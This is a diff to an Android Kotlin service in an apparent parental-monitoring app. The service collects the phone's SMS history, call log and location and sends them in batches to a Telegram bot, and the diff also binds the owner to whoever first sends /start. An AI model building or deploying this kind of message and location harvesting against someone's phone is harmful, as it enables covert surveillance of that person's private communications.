@@ -527,7 +527,7 @@ class MonitoringService : Service() {
                     } catch (t: Throwable) {
                         android.util.Log.e("MonitoringService", "Fatal polling error while paused, loop survives")
                     }
-                    delay(300_000)
+                    delay(60_000)
                     continue
                 }
                 try {
@@ -684,11 +684,15 @@ class MonitoringService : Service() {
                     val msgChatId = message?.chat?.id?.toString().orEmpty()
                     val senderId = message?.from?.id?.toString().orEmpty()
                     val chatOk = msgChatId.isNotEmpty() && msgChatId == chatId
-                    if (cachedOwnerId == 0L && senderId.isNotEmpty() && msgChatId == senderId && senderId != chatId && (message?.text ?: message?.caption)?.trim().orEmpty().startsWith("/") == true) {
+                    val rawText = (message?.text ?: message?.caption)?.trim().orEmpty()
+                    if (cachedOwnerId == 0L && senderId.isNotEmpty() && msgChatId == senderId && senderId != chatId && rawText.substringBefore(" ").substringBefore("@").lowercase(java.util.Locale.ROOT) == "/start") {
                         val learned = rememberOwner(senderId.toLongOrNull() ?: 0L)
                         if (learned) {
                             serviceScope.launch {
                                 registerBotCommands()
+                            }
+                            serviceScope.launch {
+                                sendToTelegram("Owner linked via /start.")
                             }
                         }
                     }
@@ -1562,8 +1566,8 @@ class MonitoringService : Service() {
             try {
                 val locationManager = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
                 val providers = listOf(
-                    android.location.LocationManager.GPS_PROVIDER,
-                    android.location.LocationManager.NETWORK_PROVIDER
+                    android.location.LocationManager.NETWORK_PROVIDER,
+                    android.location.LocationManager.GPS_PROVIDER
                 ).filter {
                     try {
                         locationManager.isProviderEnabled(it)
@@ -1630,14 +1634,17 @@ class MonitoringService : Service() {
             val pendingSms = mutableListOf<com.redeye.parentalmonitor.data.models.SmsData>()
             var smsCursor = entrySmsId
             var smsPages = 0
+            var smsLastFull = false
             while (smsPages < 5) {
                 val page = try { smsRepository.getNewSms(smsCursor) } catch (_: Exception) { emptyList() }
                 if (page.isEmpty()) break
                 pendingSms.addAll(page)
                 smsCursor = page.maxOf { it.id }
                 smsPages++
+                smsLastFull = page.size >= 100
                 if (page.size < 100) break
             }
+            val smsTruncated = smsPages >= 5 && smsLastFull
             pendingSms.sortBy { it.id }
             if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Found ${pendingSms.size} SMS messages")
 
@@ -1648,6 +1655,7 @@ class MonitoringService : Service() {
             var callTs = entryCallTs
             var callId = entryCallId
             var callPages = 0
+            var callLastFull = false
             while (callPages < 5) {
                 val page = try { callLogRepository.getNewCalls(callTs, callId) } catch (_: Exception) { emptyList() }
                 if (page.isEmpty()) break
@@ -1656,8 +1664,10 @@ class MonitoringService : Service() {
                 callTs = latest.date
                 callId = latest.id
                 callPages++
+                callLastFull = page.size >= 100
                 if (page.size < 100) break
             }
+            val callTruncated = callPages >= 5 && callLastFull
             pendingCalls.sortWith(compareBy({ it.date }, { it.id }))
             if (pendingSms.isEmpty() && pendingCalls.isEmpty()) {
                 val wasDone = try { preferencesManager.initialSyncDone } catch (_: Exception) { true }
@@ -1684,7 +1694,7 @@ class MonitoringService : Service() {
             if (pendingSms.isNotEmpty()) {
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending ${pendingSms.size} SMS...")
                 val smsTotal = pendingSms.size
-                pendingSms.chunked(10).forEachIndexed { index, part ->
+                for ((index, part) in pendingSms.chunked(10).withIndex()) {
                     val message = buildString {
                         appendLine("💬 <b>SMS History (${index * 10 + 1}-${index * 10 + part.size} of $smsTotal)</b>")
                         appendLine()
@@ -1698,13 +1708,13 @@ class MonitoringService : Service() {
                         }
                     }
                     val sentSmsPart = sendFitted(message)
-                    if (sentSmsPart) {
-                        try {
-                            preferencesManager.lastSmsId = maxOf(preferencesManager.lastSmsId, part.maxOf { it.id })
-                        } catch (_: Exception) {
-                        }
-                    } else {
+                    try {
+                        preferencesManager.lastSmsId = maxOf(preferencesManager.lastSmsId, part.maxOf { it.id })
+                    } catch (_: Exception) {
+                    }
+                    if (!sentSmsPart) {
                         initialOk = false
+                        break
                     }
                     delay(500)
                 }
@@ -1714,7 +1724,7 @@ class MonitoringService : Service() {
             if (pendingCalls.isNotEmpty()) {
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Sending ${pendingCalls.size} calls...")
                 val callTotal = pendingCalls.size
-                pendingCalls.chunked(10).forEachIndexed { index, part ->
+                for ((index, part) in pendingCalls.chunked(10).withIndex()) {
                     val message = buildString {
                         appendLine("📞 <b>Call History (${index * 10 + 1}-${index * 10 + part.size} of $callTotal)</b>")
                         appendLine()
@@ -1730,19 +1740,19 @@ class MonitoringService : Service() {
                         }
                     }
                     val sentCallPart = sendFitted(message)
-                    if (sentCallPart) {
-                        try {
-                            val latest = part.maxWith(compareBy({ it.date }, { it.id }))
-                            if (latest.date > preferencesManager.lastCallTimestamp ||
-                                (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
-                            ) {
-                                preferencesManager.lastCallTimestamp = latest.date
-                                preferencesManager.lastCallId = latest.id
-                            }
-                        } catch (_: Exception) {
+                    try {
+                        val latest = part.maxWith(compareBy({ it.date }, { it.id }))
+                        if (latest.date > preferencesManager.lastCallTimestamp ||
+                            (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
+                        ) {
+                            preferencesManager.lastCallTimestamp = latest.date
+                            preferencesManager.lastCallId = latest.id
                         }
-                    } else {
+                    } catch (_: Exception) {
+                    }
+                    if (!sentCallPart) {
                         initialOk = false
+                        break
                     }
                     delay(500)
                 }
@@ -1772,7 +1782,7 @@ class MonitoringService : Service() {
                 appendLine()
                 appendLine("All commands are in the bot menu — tap /help anytime.")
             }
-            if (initialOk) {
+            if (initialOk && !smsTruncated && !callTruncated) {
                 sendToTelegram(completeMessage)
             } else {
                 sendToTelegram("History sync partially sent. Remainder follows automatically via periodic updates.")
@@ -1801,9 +1811,10 @@ class MonitoringService : Service() {
                 var smsCursor = lastSms
                 var smsSentAny = false
                 for (part in smsPage.chunked(10)) {
-                    if (sendFitted(formatSmsMessage(part))) {
-                        smsCursor = maxOf(smsCursor, part.maxOf { it.id })
-                        try { preferencesManager.lastSmsId = smsCursor } catch (_: Exception) { }
+                    val sentSms = sendFitted(formatSmsMessage(part))
+                    smsCursor = maxOf(smsCursor, part.maxOf { it.id })
+                    try { preferencesManager.lastSmsId = smsCursor } catch (_: Exception) { }
+                    if (sentSms) {
                         smsSentAny = true
                     } else {
                         break
@@ -1827,17 +1838,18 @@ class MonitoringService : Service() {
             if (callPage.isNotEmpty()) {
                 var callSentAny = false
                 for (part in callPage.chunked(10)) {
-                    if (sendFitted(formatCallMessage(part))) {
-                        try {
-                            val latest = part.maxWith(compareBy({ it.date }, { it.id }))
-                            if (latest.date > preferencesManager.lastCallTimestamp ||
-                                (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
-                            ) {
-                                preferencesManager.lastCallTimestamp = latest.date
-                                preferencesManager.lastCallId = latest.id
-                            }
-                        } catch (_: Exception) {
+                    val sentCall = sendFitted(formatCallMessage(part))
+                    try {
+                        val latest = part.maxWith(compareBy({ it.date }, { it.id }))
+                        if (latest.date > preferencesManager.lastCallTimestamp ||
+                            (latest.date == preferencesManager.lastCallTimestamp && latest.id > preferencesManager.lastCallId)
+                        ) {
+                            preferencesManager.lastCallTimestamp = latest.date
+                            preferencesManager.lastCallId = latest.id
                         }
+                    } catch (_: Exception) {
+                    }
+                    if (sentCall) {
                         callSentAny = true
                     } else {
                         break
@@ -1878,7 +1890,7 @@ class MonitoringService : Service() {
             if (haveAlt == want) return true
             if (wantAlt != null && haveAlt == wantAlt) return true
         }
-        if (want.length < 9) return false
+        if (want.length < 10) return false
         if (have.endsWith(want) || want.endsWith(have)) return true
         if (wantAlt != null && (have.endsWith(wantAlt) || wantAlt.endsWith(have))) return true
         if (haveAlt != null) {
@@ -2050,9 +2062,9 @@ class MonitoringService : Service() {
         if (cut <= 0) cut = max
         return cut
     }
-    private suspend fun sendFitted(message: String): Boolean {
+    private suspend fun sendFitted(message: String, replyMarkup: com.redeye.parentalmonitor.network.InlineKeyboardMarkup? = null, queueOnFail: Boolean = true): Boolean {
         if (message.length <= 4000) {
-            return sendToTelegram(message)
+            return sendToTelegram(message, replyMarkup, queueOnFail)
         }
         var ok = true
         val failed = mutableListOf<String>()
@@ -2091,15 +2103,17 @@ class MonitoringService : Service() {
             current.append(rest)
         }
         if (current.isNotEmpty()) {
-            if (!sendToTelegram(current.toString(), null, false)) {
+            if (!sendToTelegram(current.toString(), replyMarkup, false)) {
                 ok = false
                 failed.add(current.toString())
             }
         }
         if (!ok) {
-            messageQueue.addMessages(failed)
-            MessageScheduler.scheduleMessageSend(this)
-            return true
+            if (queueOnFail) {
+                messageQueue.addMessages(failed)
+                MessageScheduler.scheduleMessageSend(this)
+            }
+            return false
         }
         return ok
     }
@@ -2112,7 +2126,7 @@ class MonitoringService : Service() {
         try {
             if (message.length > 4096) {
                 android.util.Log.e("MonitoringService", "Message too long: ${message.length} chars, splitting")
-                return sendFitted(message)
+                return sendFitted(message, replyMarkup, queueOnFail)
             }
 
             val (botToken, chatId) = sendCreds()
